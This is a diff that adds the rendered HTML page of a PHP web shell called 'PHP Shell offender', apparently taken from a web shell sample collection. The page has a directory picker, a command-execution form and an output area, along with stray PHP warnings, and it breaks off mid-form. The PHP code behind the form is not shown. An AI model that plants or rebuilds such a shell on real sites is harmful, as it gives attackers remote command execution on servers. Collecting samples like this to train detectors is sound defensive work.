@@ -1,0 +1,24 @@
+ 
+<html> 
+<head> 
+<title>PHP Shell offender</title> 
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1250"></head> 
+<body> 
+<h1>PHP Shell offender</h1> 
+ 
+<form name="myform" action="" method="post"> 
+<p>Current working directory: <b> 
+<a href="?work_dir=/">Root</a>/</b></p> 
+<p>Choose new working directory: 
+<select name="work_dir" onfiltered="this.form.submit()"> 
+
+Warning: readdir() expects parameter 1 to be resource, boolean given in C:\Users\yaoleo\Desktop\webshellSample-master\webshellSample-master\PHP\dama\39ab6b7b4e9946f4fef4d99ee6be3446.php on line 91
+
+Warning: closedir() expects parameter 1 to be resource, boolean given in C:\Users\yaoleo\Desktop\webshellSample-master\webshellSample-master\PHP\dama\39ab6b7b4e9946f4fef4d99ee6be3446.php on line 120
+ 
+</select></p> 
+<p>Command: <input type="text" name="command" size="60"> 
+<input name="submit_btn" type="submit" value="Execute Command"></p> 
+<p>Enable <code>stderr</code>-trapping? <input type="checkbox" name="stderr"></p> 
+<textarea cols="80" rows="20" readonly> 
+ 
